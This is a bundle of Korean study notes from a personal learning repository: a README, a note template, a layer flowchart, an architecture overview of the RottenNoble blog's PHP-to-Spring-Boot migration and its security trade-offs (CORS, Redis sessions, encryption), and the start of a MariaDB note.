<script type="text/markdown" data-name="README.md">
# StudyProject

> **세션을 시작하면 먼저 `DevelopPrompt`를 본다.** 이 저장소 자체엔 규칙이 없다 — 이 저장소가 어떻게
> 쓰이는지의 정책은 `DevelopPrompt/POLICY/STUDY.md`("StudyProject 연동" 절)에 있고, "왜 이 주제가
> 궁금해졌는지"의 배경은 `DevelopPrompt/CurrentProject/_{프로젝트명}/Study.md`의 각 `STUDY-nn` 항목에
> 있다. 여기 문서만 보고 시작하지 않는다.

Study with DevelopPrompt — 여러 프로젝트에서 궁금해졌던 것(각 프로젝트의 `Study.md` 백로그)을 실제로 파고들어 공부한 내용을 쌓는 저장소입니다.

각 프로젝트의 `Study.md` 항목과 여기 내용을 서로 링크해서, "왜 궁금해졌는지"는 원래 프로젝트에, "실제로 무엇을 배웠는지"는 여기에 남깁니다.

## 브라우저로 보기

저장소 루트의 [`build_bundle.cmd`](build_bundle.cmd)를 더블클릭하면 이 저장소의 모든 `.md`
문서를 한 번에 내장한 `DOCS_BUNDLE.html`이 생성됩니다 — 그 파일 하나만 더블클릭해서 열면 사이드바
탐색(카테고리별 그룹) + 검색이 되는 문서 뷰어로 전부 읽을 수 있습니다(`DevelopPrompt/VIEWER`와
같은 엔진을 그대로 재사용, 자세한 건 [`VIEWER/README.md`](VIEWER/README.md)). `DOCS_BUNDLE.html`은
파생물이라 `.md`가 원본이고, 문서를 고치면 다시 만들어야 최신 내용이 반영됩니다.

## 구조

- **카테고리별 폴더 트리로 정리한다** — `ComputerScience/{분야}/{주제}.md` (예:
  `ComputerScience/Network/CORS.md`). 분야 폴더는 필요에 따라 늘어난다(현재:
  `WebDevelopment`, `Database`, `Infrastructure`, `Security`, `Network`, `Architecture`).
  주제 하나가 여러 카테고리에 걸치면(문서 상단 메타의 "카테고리" 필드는 1~3개 가능) 가장 주된
  분야의 폴더에 두고, 메타 필드로 나머지를 표시한다 — 폴더는 하나, 태그는 여러 개.
- 새 주제를 시작할 때 [`_TEMPLATE.md`](_TEMPLATE.md)를 복사해서, 해당 카테고리 폴더 안에 쓴다.
  맞는 카테고리 폴더가 아직 없으면 새로 만든다.
- 문서 상단엔 항상 어느 프로젝트의 어느 `STUDY-nn`에서 왔는지 백링크를 남긴다.
- 다 배우면 원본 `Study.md` 쪽 항목 상태를 "완료"로 바꾸고 결론 한 줄 + 이 저장소 문서 경로를
  덧붙인다(내용 자체는 `Study.md`로 복사하지 않는다 — 원본은 항상 여기 하나뿐).
- **문체가 `DevelopPrompt`와 다르다.** `DevelopPrompt`의 정책·`CODE_MEMO.md`는 AI 에이전트가 빠르게
  훑도록 압축한 컨텍스트 문서지만, 여기는 **사람이 읽고 배우는 교재**다. 개념을 실제로 설명하는
  문장으로 풀어 쓰고, 표는 비교·정리용으로만 쓴다 — 자세한 형식은 `_TEMPLATE.md` 참고.
- **레포지토리 하나를 전체적으로 다룰 땐 개요 문서를 하나 더 둔다.** 개별 기술 문서들과 별개로,
  그 저장소가 속한 카테고리 폴더(주로 `Architecture/`) 안에 `{저장소명}.md` 형태로 아키텍처
  요약·기술 스택 표·특이할 점을 모은 색인 문서를 만든다 (예:
  [`ComputerScience/Architecture/RottenNoble-Project.md`](ComputerScience/Architecture/RottenNoble-Project.md)).
  개별 문서가 "나무"라면 이 문서는 "숲"이다.

## 카테고리 지도

```
ComputerScience/
├── Architecture/       저장소 개요, 코드 직접 학습 세션 기록
├── Database/           MariaDB, mysqli, SQL
├── Infrastructure/     Redis, 배포, 자체 호스팅
├── Network/            CORS, HTTPS, HTTP 프로토콜 일반
├── Security/           인증·인가, 해싱, 토큰 저장
└── WebDevelopment/     PHP, React, 라우팅, API 설계
```

## 상세

본문. 배경(왜 이런 게 생겼는지) → 동작 원리 → 실제로 이 프로젝트에서 어떻게 쓰였는지 순서로,
이야기하듯 풀어서 설명한다. 필요하면 소제목(`###`)으로 나눈다.

## 비교표

이 주제와 대안이 되는 것들을 표로 정리한다. 표 자체는 요약이고, 왜 그런 차이가 나는지는 위
[상세]에서 이미 설명돼 있어야 한다.

| 항목 | 이 주제 | 대안 A | 대안 B |
|---|---|---|---|
| ... | ... | ... | ... |

## 질문

스스로 묻고 답하며 이해를 점검하는 자리. 실제로 궁금했던 것, 헷갈렸던 것을 적는다.

- **Q. {질문}**
  A. {답}

## 예시 코드

가능하면 실제로 이 프로젝트에서 가져온 코드를 우선 쓰고, 없으면 개념을 보여주는 최소 예시를 쓴다.
코드만 던지지 않고, 코드 위아래에 무엇을 보라는 건지 한두 줄 짚어준다.

```language
// 실제 코드 또는 최소 예시
```

## 플로우차트

이 주제를 그림으로 그려야 이해가 빨라지는 경우에만 만든다(모든 주제에 필요한 건 아니다 — 판단
기준은 `DevelopPrompt/Unity/VISUALIZE_RULE/00_VISUALIZING_POLICY.md` §1). 그린다면 본문에
직접 넣지 않고 같은 디렉토리에 별첨 파일로 둔다:

→ [`{주제}.flow.md`](./{주제}.flow.md)

별첨 파일은 `VISUALIZE_RULE` 규칙을 따른다 — Mermaid, `TD` 방향(위가 더 상위/근본적인 개념, 이
주제에서 이어지는 후속 개념은 아래), 노드 12개 상한, 그림 아래 "읽는 법"과 "핵심 한 줄" 필수.

## 실무

- 실무에서 얼마나 흔하게 쓰이는지, 어떤 규모/상황에 적합한지
- 실무에서 흔히 쓰는 대안과 그 이유
- 최근 동향(있다면) — 이 항목은 [기준 시점]이 특히 중요하다, 동향은 금방 바뀐다

## 같이 보기

이 저장소 **안**의 다른 주제 문서로의 링크. (외부 자료는 아래 [참고자료]로 분리한다.)

- [{관련 주제}](./{관련주제}.md)

## 참고자료

공식 문서, RFC, 책, 아티클 등 **외부** 출처. 주장의 근거가 되는 자료를 남긴다.

- {링크 또는 문헌}

## 개정 이력

내용을 지우고 다시 쓰지 않는다 — 새 줄로 덧붙인다. 다른 주제를 공부하다가 이 문서를 고칠 일이
생기면(예: 관련 주제에서 새로 알게 된 사실이 이 문서의 설명과 어긋날 때) 반드시 여기 기록한다.

| 날짜 | 무엇을 바꿨나 | 계기 |
|---|---|---|
| {YYYY-MM-DD} | 최초 작성 | {무엇을 보다가 시작했나} |

# RottenNoble-Project — 레이어는 누구를 참조하나

> `RottenNoble-Project.md`의 별첨 플로우차트. 작성 규칙은
> `DevelopPrompt/Unity/VISUALIZE_RULE/04_MERMAID_STYLE.md`를 따른다.
> 기준 시점: 2026-09-08

```mermaid
flowchart TD
    subgraph FE["프런트엔드 - React(CRA)"]
        PAGE["pages/*.jsx"]
        API["api/*.js"]
        AUTHJS["auth.js - localStorage"]
    end

    subgraph BE["백엔드 - PHP, 프레임워크 없음"]
        EP["엔드포인트 - *.php"]
        RESP["response.php - CORS/봉투"]
        GUARD["auth.php - require_admin"]
        DBPHP["db.php"]
        REDISPHP["redis_client.php"]
    end

    subgraph STORE["저장소"]
        MARIA[("MariaDB")]
        REDIS[("Redis")]
    end

    PAGE --> API
    API --> AUTHJS
    API -->|"HTTP/JSON"| EP
    EP --> RESP
    EP --> GUARD
    GUARD --> REDISPHP
    EP --> DBPHP
    EP --> REDISPHP
    DBPHP --> MARIA
    REDISPHP --> REDIS
```

**읽는 법**: 화살표는 "안다 / 호출한다". `PAGE`는 `API`만 알고 `EP`를 직접 모른다 — 통신은 항상
`api/*.js` 계층을 거친다. 백엔드 쪽도 마찬가지로 `EP`가 `RESP`/`GUARD`/`DBPHP`/`REDISPHP`를
직접 호출하고, 그 아래 실제 저장소(`MARIA`/`REDIS`)는 각각 전용 접근 코드를 통해서만 닿는다.

**핵심**: 백엔드와 프런트엔드가 서로 다른 언어인데도 "엔드포인트/페이지 하나는 얇게 두고, 공통
관심사(CORS·인증·요청 헬퍼)만 별도 파일로 뽑는다"는 같은 구조 원칙을 대칭적으로 따르고 있다.

# RottenNoble-Project — 저장소 개요

---

- **카테고리**: 웹 개발, 아키텍처
- **상태**: 완료
- **기준 시점**: 2026-09-09
- **관련 레포지토리**: `RottenNoble-Project`

---

> 이 문서는 개별 기술 하나를 다루는 다른 문서들과 달리, **`RottenNoble-Project` 저장소 전체를
> 조망하는 색인 겸 아키텍처 요약**이다. 각 기술의 자세한 설명은 아래 표에서 링크된 개별 문서를
> 본다. 코드를 순서대로 훑어간 세션 기록 자체는
> [`RottenNobleProject-Architecture.md`](./RottenNobleProject-Architecture.md)에 남아있다.
>
> **(2026-09-09 갱신) 전환 완료 + 프로덕션 배포됨 — 그러나 Git 상태와 어긋나 있다.** 2026-09-08에
> 시작된 PHP → Java Spring Boot 전환(원래 PR #3, `server/` 모듈)은 그 PR이 머지 없이 close된 뒤,
> 다른 세션이 브랜치 `rewrite/spring-boot-vite`(`develop`에서 분기, 아직 PR 없음)에서
> `backend-spring/`라는 새 모듈로 다시 짜서 **실제로 프로덕션에 배포하고 검증까지 마쳤다** —
> 지금 `rotten-noble.com`이 서빙하는 백엔드는 더 이상 PHP가 아니라 Spring Boot다. 프런트 빌드
> 도구도 CRA→Vite로 같이 전환·배포됨. 다만 이 모든 변경이 저장소의 `develop`/`main` 브랜치엔 아직
> 머지되지 않아, **실제 배포 상태가 git 히스토리보다 앞서 있는** 상태다. 아래 "기술 스택"/
> "특이할 점"은 이 최신 상태를 반영해 갱신했다 — 전환 배경과 실측으로 드러난 세부 내용은
> [Spring Boot](../WebDevelopment/Spring-Boot.md)에 정리했다.

## 출처

`RottenNobleProject` — 개별 주제 문서 12개를 다 쓴 뒤, 전체 그림을 한 곳에서 볼 수 있도록
작성한 개요 문서.

## 정의

RottenNoble은 가비아 도메인과 Synology NAS로 직접 운영하는 개인 포트폴리오 블로그(게시글 +
방명록)다. React 프런트엔드와 Java Spring Boot 백엔드가 완전히 독립된 두 프로세스로 실행되고,
HTTP/JSON으로 통신한다(`POLICY/MULTI_ENGINE.md`의 Peer 패턴). 원래는 프레임워크 없는 PHP
백엔드였으나 2026-09-09 기준 Spring Boot로 완전히 교체돼 프로덕션에 배포된 상태다 — PHP는
학습 기록과 롤백 대비용으로만 코드가 남아있다.

## 요약

이 저장소는 "프레임워크가 해주던 일을 손으로 직접 짜본다"는 학습 목표와 "이미 가진 NAS를
활용한다"는 비용 제약, 이 두 축이 대부분의 기술 선택을 설명한다. 그 결과 백엔드·프런트엔드
양쪽 다 "파일 하나 = 역할 하나"라는 대칭적으로 얇은 구조를 갖게 됐고, 인증만큼은 기존
인프라(Redis)와의 일관성을 위해 실무 표준(JWT)이 아닌 opaque 세션 토큰을 선택했다.

## 아키텍처

### 레이어 구조

```
프런트엔드(React, CRA)              백엔드(PHP, 프레임워크 없음)
─────────────────────              ────────────────────────────
pages/*.jsx  (라우트 1개 = 폴더 1개)   *.php (엔드포인트 1개 = 파일 1개)
     │                                    │
api/*.js  (리소스 1개 = 파일 1개) ──JSON──▶ response.php (CORS + 봉투)
     │                                    │
auth.js (localStorage 토큰)         auth.php (require_admin 가드)
                                          │
                                     db.php (MariaDB) / redis_client.php (Redis)
```

→ 레이어 구조를 그림으로 본 상세 버전은
[`RottenNoble-Project.flow.md`](./RottenNoble-Project.flow.md).

**(2026-09-09) 위 다이어그램은 PHP 시절 기준이다.** 지금 프로덕션의 백엔드 계층은
`backend-spring/`(Spring Boot, 컨트롤러/서비스/리포지토리 계층 구조)로 바뀌었지만, "프런트가
`api/*.js`로 JSON 호출 → 백엔드가 봉투에 담아 응답"이라는 통신 계약 자체는 그대로다. 새 계층
구조는 [Spring Boot](../WebDevelopment/Spring-Boot.md) 참고 — 그림은 아직 갱신하지 않았다(PHP
버전도 학습 자료로서 여전히 유효해 남겨둠).

### 데이터가 실제로 흐르는 경로

1. 브라우저가 `pages/*.jsx`를 렌더링 → `api/*.js`가 `fetch`로 백엔드 호출
2. PHP 엔드포인트가 `response.php`(CORS)·`auth.php`(보호된 엔드포인트만)를 거쳐 요청 처리
3. `db.php`(MariaDB, 글/방명록 같은 영구 데이터) 또는 `redis_client.php`(Redis, 세션처럼
   휘발성 데이터)로 실제 데이터 접근
4. `response.php`의 `send_json`/`send_error`로 `{status, data|message}` 봉투에 담아 응답
5. `api/*.js`의 공통 `request()`가 봉투를 까서 페이지 컴포넌트에 순수 데이터만 전달

## 기술 스택

| 계층 | 기술 | 상세 문서 |
|---|---|---|
| 백엔드 언어 | **Java Spring Boot 4.1.1(Java 21), `backend-spring/`** — 2026-09-09 프로덕션 배포 완료. PHP는 롤백 대비용으로만 코드 보존 | [PHP](../WebDevelopment/PHP.md), [Spring Boot](../WebDevelopment/Spring-Boot.md) |
| 관계형 DB | MariaDB 10 (Spring Data JPA + Flyway `baseline-on-migrate`, 기존 PHP 시절 스키마 그대로 채택) | [MariaDB](../Database/MariaDB.md) |
| 세션 저장소 | Redis (PHP 시절엔 RESP 직접 구현, Spring은 `spring-boot-starter-data-redis`) | [Redis](../Infrastructure/Redis.md) |
| 인증 방식 | Opaque 토큰 + Redis 세션 (JWT 아님) — 전환 후에도 그대로 유지 | [JWT vs Redis 세션](../Security/JWT-vs-Redis-Session.md) |
| 비밀번호 저장 | bcrypt (`spring-security-crypto`의 `BCryptPasswordEncoder`, 기존 PHP 해시와 호환) | [비밀번호 해싱](../Security/Password-Hashing.md) |
| API 스타일 | REST(`/api/**`, 경로 변수 방식으로 변경) + `{status, data\|message}` 봉투 유지 | [REST API 설계](../WebDevelopment/REST-API-Design.md) |
| 프런트엔드 | React 19 | [React](../WebDevelopment/React.md) |
| 라우팅 | react-router-dom, `HashRouter` | [React Router](../WebDevelopment/React-Router.md) |
| 빌드 도구 | **CRA → Vite 전환 완료(2026-09-09)**, 의존성 1188→64개 | [CRA → Vite](../WebDevelopment/CRA-vs-Vite.md) |
| 토큰 저장 | 브라우저 `localStorage` | [Token Storage](../Security/Token-Storage.md) |
| CORS | **와일드카드**(`*`) — 2026-09-08에 준비된 허용목록 패치는 머지 안 됨, 새 Spring 백엔드가 다시 와일드카드를 명시적으로 선택 | [CORS](../Network/CORS.md) |
| 배포 인프라 | Synology NAS — 프런트/구 PHP는 Web Station, 새 Spring 백엔드는 Docker 컨테이너 + `api.rotten-noble.com` 서브도메인(리버스 프록시가 경로 라우팅 미지원) | [HTTPS & Mixed Content](../Network/HTTPS-and-Mixed-Content.md), [자체 호스팅 vs 클라우드](../Infrastructure/Self-Hosting-vs-Cloud.md) |
| 요청 제한 | Redis 기반 IP별 rate limiting — Spring `@RateLimit`+인터셉터로 이식, 프로덕션 검증됨 | [Rate Limiting](../Security/Rate-Limiting.md) |
| 개인정보 저장 | **암호화 없음(회귀)** — PHP 시절 AES-256-GCM이 새 Spring 백엔드엔 이식 안 됨 | [저장 데이터 암호화](../Security/Encryption-at-Rest.md) |

## 특이할 점

이 저장소를 훑으며 "보통의 튜토리얼 프로젝트와 다르다"고 느낀 지점들을 모았다.

1. **세 언어가 프로토콜 수준에서 인프라를 공유한다.** PHP(`redis_client.php`)가 라이브러리 없이
   RESP 프로토콜을 직접 구현한 이유는, Node(`RottenNoble-HttpServer`)와 C++
   (`RottenNoble-TCPServer`)가 같은 Redis 인스턴스를 완전히 동일한 커맨드 패턴으로 다뤄야 하기
   때문이다 — 이 저장소 하나만 봐서는 이유가 안 보이고, 형제 저장소들과의 관계를 알아야 이해되는
   설계다.
2. **실무 표준(JWT)을 알면서도 의도적으로 다른 선택을 했다.** `MEMO-WEB-04`를 보면 JWT를 몰라서
   Redis 세션을 쓴 게 아니라, "이 규모에서는 즉시 무효화가 확장성보다 중요하다"는 판단 아래
   의도적으로 비주류를 택했다. 문서에 그 비교와 근거가 명시적으로 남아있다는 게 특이하다.
3. **문서화된 보안 결정과 실제 코드가 갈라졌다가, 실제 공격 시도를 계기로 다시 합쳐졌다가, 스택
   재작성으로 또 갈라진 사례가 있다.** `MEMO-WEB-02`가 "인증 엔드포인트엔 CORS 와일드카드를
   복사하지 말라"고 스스로 경고해뒀는데, 처음 구현은 그 경고를 지키지 못한 채 배포됐다 — 2026-09-08
   실제 스캔/프로빙을 겪은 뒤에야 명시적 origin 허용목록·rate limiting·방명록 암호화가 PHP
   패치로 준비됐다. 하지만 백엔드가 곧바로 Spring Boot로 재작성되면서 그 PHP 패치는 머지될 기회
   없이 close됐고, 새 스택엔 **rate limiting만 이식되고 CORS 허용목록과 암호화는 빠졌다**
   ([CORS](../Network/CORS.md), [Rate Limiting](../Security/Rate-Limiting.md),
   [저장 데이터 암호화](../Security/Encryption-at-Rest.md)의 "2026-09-09 갱신" 절 참고).
   "알려진 갭이 실제로 익스플로잇되기 전까지는 우선순위에서 밀린다"는 패턴에 더해, "스택을
   갈아엎는 재작성은 이전에 고쳐둔 보안 항목을 명시적 체크리스트 없이도 조용히 되돌릴 수 있다"는
   패턴까지 이 저장소 하나에서 두 번 다 관찰된다.
4. **인프라 제약이 기술 선택을 여러 단계로 역산시켰다.** "이미 NAS가 있다" → "NAS가 MariaDB를
   기본 지원한다" → "로컬도 같은 Apache+PHP 조합(XAMPP)으로 맞춘다"로 이어지는 연쇄, 그리고
   "Web Station GUI로 rewrite 설정을 못 만진다" → "HashRouter로 우회한다"는 연쇄가 둘 다 같은
   NAS 선택 하나에서 갈라져 나왔다.
5. **"프레임워크가 없다"는 선택이 백엔드/프런트 양쪽에서 대칭적으로 나타난다(PHP 시절 기준).**
   백엔드는 파일 하나가 엔드포인트 하나, 프런트는 페이지 폴더 하나가 라우트 하나 — 서로 다른
   언어인데 구조적 철학이 같다. 두 계층을 서로 다른 세션에서 배웠는데도 나중에 보니 같은
   패턴이었다는 게 이 저장소를 순서대로 훑는 재미이기도 하다.
6. **실제 배포 상태가 이 저장소의 git 히스토리보다 앞서 있다.** 2026-09-09 기준, 프로덕션에
   떠 있는 Spring Boot+Vite 코드는 브랜치 `rewrite/spring-boot-vite`에만 존재하고
   `develop`/`main`엔 아직 머지되지 않았으며 그 브랜치용 PR조차 없다 — 반면 그 이전에 이 스택
   전환을 시도했던 PR #2·#3(같은 목표, 다른 구현)는 머지 없이 close됐다. 저장소를 git 로그만
   보고 파악하면 "아직 PHP를 쓰고 있다"고 착각하기 쉽다 — 개인 프로젝트에서 "일단 빨리 배포해
   두고 PR/머지는 나중에"라는 흐름이 git 상태를 실제 운영 상태의 신뢰할 만한 스냅샷이 아니게
   만들 수 있다는 걸 보여주는 사례다.

이 프로젝트의 스택 선택은 대체로 "표준적으로 제일 좋은 것"보다 **제약(NAS 고정, 학습 목적)에 맞춘
선택**이 많다 — MariaDB·XAMPP는 NAS 제약에서 역산됐고, PHP 무프레임워크는 학습 목적이 이유. 유일하게
"딱히 의도적으로 고른 게 아니라 그냥 따라온" 것이 CRA였고, 여기가 지금 유일하게 실제 대가(테스트
깨짐)를 치른 지점이기도 하다.

## 배운 것 (2026-09-08, 2회차 — 아키텍처 계층)

### 백엔드 (`backend/`) — "파일 하나 = 엔드포인트 하나", 공통 부분만 따로 뽑음

| 파일 | 계층 | 역할 |
|---|---|---|
| `get_posts.php`, `get_post.php`, `get_guestbook.php`, `create_guestbook_entry.php`, `create_post.php`, `update_post.php`, `delete_post.php`, `login.php`, `logout.php`, `index.php` | 엔드포인트(라우팅 없이 URL 경로 = 파일 경로) | 각 파일은 짧다 — `require 'response.php'; require 'db.php'; allow_cors(); <SQL 한두 줄>; send_json(...)` 패턴이 거의 전부. 프레임워크의 "컨트롤러"에 해당하는 걸 파일 단위로 쪼갠 것 |
| `response.php` | 공통 유틸(횡단 관심사) | `allow_cors()`(CORS 헤더 + OPTIONS 프리플라이트 처리) / `send_json()`·`send_error()`(`{status, data}` 또는 `{status, message}` 봉투로 통일 + `exit`) — 1회차에서 본 "반복되던 코드를 뽑아낸 지점"이 정확히 여기 |
| `db.php` | 공통 유틸(인프라) | `config.local.php`(gitignore)에서 접속정보를 읽어 mysqli 커넥션(`$conn`)을 전역으로 만들어줌. 각 엔드포인트는 `require`만 하면 `$conn` 사용 가능 — DI 컨테이너 없이 "그냥 전역 변수"로 해결한 게 특징 |
| `auth.php` | 미들웨어 역할(단, 프레임워크의 미들웨어 체인이 아니라 **함수 호출**) | `require_admin()` — `Authorization: Bearer {token}` 헤더를 파싱해 Redis의 `admin_session:{token}` 키를 조회, 값이 `'admin'`이 아니면 `send_error(401)`로 즉시 종료. 보호가 필요한 엔드포인트(`create_post.php` 등) 맨 위에서 이 함수 한 줄만 호출하는 방식 — Express의 미들웨어 개념을 프레임워크 없이 "가드 함수"로 흉내낸 형태 |
| `lib/redis_client.php` | 저수준 인프라 | Composer/phpredis 확장 없이 RESP 프로토콜(`*N\r\n$len\r\n...`)을 소켓으로 직접 구현한 최소 클라이언트(GET/SET EX/DEL만). **왜 직접 짰나** — 주석에 명시: `RottenNoble-HttpServer`(Node)·`RottenNoble-TCPServer`(C++/hiredis)와 **완전히 같은 Redis 인스턴스**를 같은 커맨드로 공유해야 해서, PHP만 라이브러리에 의존하면 프로토콜 세부동작이 미묘하게 갈릴 위험을 없앤 것. 세 언어가 한 Redis를 같은 방식으로 말하게 만든 설계 |
| `sql/schema.sql` | 데이터 계층 | 마이그레이션 도구 없이 수동 반영하는 스키마 원본 |

**계기/비교**: `HttpServer`/`TCPServer`는 이 블로그 프로젝트와 무관한 별도 리포지토리(`StylizedActionRPG`의
네트워킹 피어)인데, `admin_session:{token}` 세션만큼은 **같은 Redis 인스턴스와 같은 RESP 커맨드 패턴**을
세 프로젝트가 공유하고 있었다 — 프로젝트 경계와 인프라 공유 경계가 다르게 그어진 사례.

### 프런트엔드 (`frontend/src/`) — 백엔드와 대칭적인 "얇은 페이지 + 얇은 API 계층"

| 위치 | 역할 |
|---|---|
| `App.js` | `HashRouter`(BrowserRouter 아님 — NAS Apache가 SPA fallback rewrite를 안 갖췄을 가능성이 높아 보임, `#/posts/1`처럼 해시로 라우팅해 서버가 항상 `index.html`만 주면 되게 함) + `<Routes>`로 페이지 매핑. `Nav`가 로그인 상태(`isLoggedIn()`)에 따라 메뉴를 바꿈 |
| `pages/{Name}/{Name}.jsx` | 라우트 하나 = 폴더 하나(`PostList`, `PostDetail`, `PostEditor`, `Guestbook`, `Login`) — 백엔드의 "파일 하나 = 엔드포인트 하나"와 같은 결의 얇은 단위 분리 |
| `api/posts.js`, `api/auth.js`, `api/guestbook.js` | 백엔드 리소스 1개당 파일 1개. `posts.js`의 `request()` 헬퍼가 `fetch` 후 `{status, data}` 봉투를 까서 `status !== 'ok'`면 에러를 던짐 — 백엔드 `response.php`의 봉투 형식과 정확히 맞물리는 대칭 설계 |
| `api/auth.js` | 토큰을 `localStorage`(`rotten_admin_token`)에 저장, `authHeaders()`로 `Authorization: Bearer` 헤더를 만들어 `posts.js`의 쓰기 요청에 주입. 로그인 자체는 `fetch`를 직접 씀(공통 `request()` 안 거침 — 로그인은 아직 토큰이 없는 상태라 자연스러운 예외) |

### 결론 (2회차 한정)

양쪽 다 **"프레임워크가 주는 구조를 손으로 재현"**한 형태다 — 백엔드는 라우터 대신 파일 경로,
컨트롤러 대신 짧은 스크립트, 미들웨어 대신 가드 함수(`require_admin()`); 프런트는 관례적으로도 이미
"페이지 폴더 + API 계층 분리"가 표준적인 React 패턴이라 여기선 자연스럽게 나왔다. 유일하게 눈에 띄는
비표준 설계는 `lib/redis_client.php`를 직접 구현한 부분인데, 이건 "몰라서 직접 짠" 게 아니라
**세 언어(PHP/Node/C++)가 같은 Redis를 같은 방식으로 말해야 한다**는 명확한 이유가 있는 선택이었다.

## 배운 것 (2026-09-08, 3회차 — 프런트-백엔드 통신 & 인증 흐름)

### 요청/응답 봉투

성공 `{status:'ok', data}` / 실패 `{status:'error', message}` — `frontend/src/api/posts.js`의
`request()`가 이 봉투를 까서 `status !== 'ok'`면 `Error(message)`를 던진다. 단, `auth.js`의
`login()`/`logout()`은 이 공통 `request()`를 안 쓰고 `fetch`를 직접 호출한다 — 로그인은 아직 토큰이
없어서 `authHeaders()`를 붙일 필요가 없는 자연스러운 예외지만, 봉투를 까는 로직(`body.status !== 'ok'`
검사)은 `auth.js`에도 똑같이 손으로 다시 써 있다 — 완전히 같은 코드가 두 파일에 한 번씩 더 반복됨.

### CORS 실동작 — 문서(MEMO-WEB-02)와 코드가 갈라진 지점

`response.php`의 `allow_cors($methods)`는 엔드포인트 종류와 무관하게 항상
`Access-Control-Allow-Origin: *`를 붙이고, `OPTIONS` 프리플라이트는 204로 즉시 종료한다. 그런데
`CODE_MEMO.md`의 `MEMO-WEB-02`는 명시적으로 이렇게 적어뒀다:

> "관리자 글쓰기/수정 같은 **인증 붙는 엔드포인트를 추가할 때 이 와일드카드를 그대로 복사하면 안 된다**
> — 그때는 쿠키/토큰이 오가므로 명시적 origin 허용목록으로 바꿔야 한다."

실제로는 `login.php`/`logout.php`/`create_post.php`/`update_post.php`/`delete_post.php` 전부
`allow_cors()`를 공유 함수 그대로 호출해서, 경고했던 그 와일드카드를 그대로 쓰고 있다 — 문서화된
결정과 실제 구현이 어긋난 지점.

**왜 지금 당장 위험하지 않은가**: 이 프로젝트는 쿠키가 아니라 `Authorization: Bearer {token}` 헤더로
인증한다. 브라우저는 쿠키와 달리 커스텀 헤더를 다른 origin 요청에 자동으로 붙여주지 않으므로,
`evil.com`의 스크립트가 `rotten-noble.com`에 요청을 보내도 토큰을 모르면(다른 origin의
`localStorage`는 읽을 수 없음) 인증을 통과시킬 방법이 없다 — 쿠키 기반이었다면 뚫렸을 클래식 CSRF가
여기선 토큰 저장 방식 자체 때문에 막혀 있다. 그래도 `MEMO-WEB-02`가 스스로 남긴 경고가 안 지켜진
채로 남아있다는 사실 자체는 기록해둘 만하다(고치자는 게 아니라, 문서-코드 드리프트 사례로).

### 인증 흐름 (로그인 → 요청 → 로그아웃)

1. `login.php` — `username`/`password`를 `config.local.php`의 `admin_user`/`admin_password_hash`와
   비교(`password_verify`, bcrypt류). 성공하면 `bin2hex(random_bytes(32))`로 32바이트 랜덤 토큰을
   만들고 Redis에 `SET admin_session:{token} 'admin' EX 86400`(24시간) 저장 후 `{token}` 반환.
2. 프런트 `auth.js`가 토큰을 `localStorage`(`rotten_admin_token`)에 저장.
3. 쓰기 요청(`createPost`/`updatePost`/`deletePost`)마다 `authHeaders()`가
   `Authorization: Bearer {token}`을 주입.
4. `auth.php`의 `require_admin()`이 헤더를 파싱해 Redis에서 `admin_session:{token}`을 `GET` — 값이
   정확히 `'admin'`이 아니면(만료·위조 포함) `401`로 즉시 종료.
5. `logout.php` — Redis에서 `DEL admin_session:{token}`. Redis 호출이 실패해도 조용히 넘어간다(주석:
   "클라이언트가 토큰을 버리면 사실상 끝나므로") — 로그아웃 실패를 사용자에게 보여줄 필요가 없다는
   판단.
6. 갱신(refresh) 로직은 없다 — 24시간 TTL이 지나면 Redis가 키를 자동 만료시키고, 다음 보호된 요청이
   그냥 401을 맞는다. 프런트는 이걸 미리 감지하지 않고, 실제 요청이 실패해야 알게 된다.

### UI 에러 처리 패턴

`Login.jsx`·`PostEditor.jsx` 둘 다 같은 모양이다 — 로컬 `error`/`submitting` state, `.catch(err =>
setError(err.message))`, 전역 에러 바운더리/토스트 없이 각 페이지가 자기 에러를 직접 그림. 로그인
성공 시엔 라우터 `navigate()` 대신 `window.location.href = '/'`로 **전체 새로고침**을 의도적으로
쓰는데, 주석에 이유가 있다 — `Nav`의 로그인 상태는 마운트 시점에만 읽으므로 전역 상태 라이브러리 없이
Nav를 확실히 최신화하려면 새로고침이 제일 간단하다는 판단(이 규모에 Redux/Context 도입은 과함).

### 결론 (3회차 한정)

인증 방식이 쿠키가 아니라 헤더 토큰이라는 선택 하나가, CORS 와일드카드가 남아있어도 클래식 CSRF는
막아주는 결과로 이어졌다 — 다만 이건 설계 당시 의도적으로 노린 방어라기보다 결과적으로 그렇게 된
쪽에 가까워 보인다(`MEMO-WEB-04`엔 Redis opaque 토큰을 고른 이유로 "즉시 무효화 가능"만 적혀있고
CORS와의 상호작용은 언급이 없음). `STUDY-01`(JWT vs 여기 Redis 세션)을 실제로 공부할 때, Redis TTL
24시간이 JWT의 `exp` 클레임과 같은 역할을 한다는 점 + "즉시 무효화"가 JWT엔 기본으로 없다는 트레이드
오프를 이 코드가 실물로 보여준다는 게 좋은 출발점이 될 것 같다.

  `Study.md`의 STUDY-01 항목을 "학습 중"으로 바꾸고 시작)

  사항으로 남겨둠 — 지금 당장 손대지 않음

# MariaDB (와 mysqli)

---

- **카테고리**: 웹 개발, 데이터베이스
- **상태**: 완료
- **기준 시점**: 2026-09-08, MariaDB 10.x 기준
- **관련 레포지토리**: `RottenNoble-Project`

---

## 출처

`RottenNobleProject` — `RottenNobleProject-Architecture.md` 코드 직접 학습 세션(1회차 환경/스택,
2회차 아키텍처 계층)에서 나온 주제.

## 정의

MariaDB는 MySQL에서 갈라져 나온(포크) 오픈소스 관계형 데이터베이스(RDBMS)다. MySQL을 인수한
오라클의 라이선스 정책 변화에 반발해 MySQL의 원 개발자들이 2009년에 시작한 프로젝트로, SQL 문법과
접속 방식이 MySQL과 거의 동일해서 "MySQL을 쓰던 코드를 그대로 MariaDB로 옮길 수 있다"는 게
핵심적인 특징이다. 실제로 이 프로젝트의 PHP 코드는 `mysqli`(MySQL Improved)라는, 이름부터 MySQL을
전제로 한 PHP 확장 모듈을 그대로 써서 MariaDB에 접속한다.

## 요약

RottenNobleProject가 MariaDB를 쓰는 이유는 "MariaDB가 기술적으로 더 낫다"는 판단이 아니라, 배포
대상인 Synology NAS(Web Station)가 기본으로 지원하는 DB가 MariaDB이기 때문이다 — 인프라 제약이
기술 선택을 역산한 사례다.

## 상세

### 왜 MySQL이 아니라 MariaDB인가

겉보기엔 "그냥 MySQL 쓰면 되지 않나" 싶을 수 있지만, 이 프로젝트의 실제 제약은 로컬 개발 환경이
아니라 **배포 환경**에서 나왔다. 프로덕션이 개인 소유 Synology NAS의 Web Station 위에서 돌아가는데,
